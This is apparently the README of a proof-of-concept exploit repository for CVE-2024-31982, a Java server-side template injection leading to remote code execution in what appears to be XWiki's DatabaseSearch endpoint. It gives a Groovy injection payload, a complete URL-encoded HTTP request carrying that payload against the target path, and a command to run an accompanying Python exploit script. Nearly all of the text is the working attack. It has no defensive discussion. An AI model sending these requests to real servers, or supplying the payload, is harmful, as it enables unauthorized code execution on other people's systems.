# CVE-2024-31982

![Snipaste_2024-06-22_16-25-38](README.assets/Snipaste_2024-06-22_16-30-07.png)



Java SSTI -> Lead to RCE

```
}}}{{async async=false}}{{groovy}}println("Successful Injection"){{/groovy}}{{/
```



```
GET /bin/get/Main/DatabaseSearch?outputSyntax=plain&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%22Successful%20Injection%22%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2F HTTP/1.1
Host: xxxx
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: http://1.117.185.47:8011/bin/view/Main/
Cookie: JSESSIONID=10D76FBAF45134404510556146000E4D
```



# Usage

```
python3 CVE-2024-31982.py
```

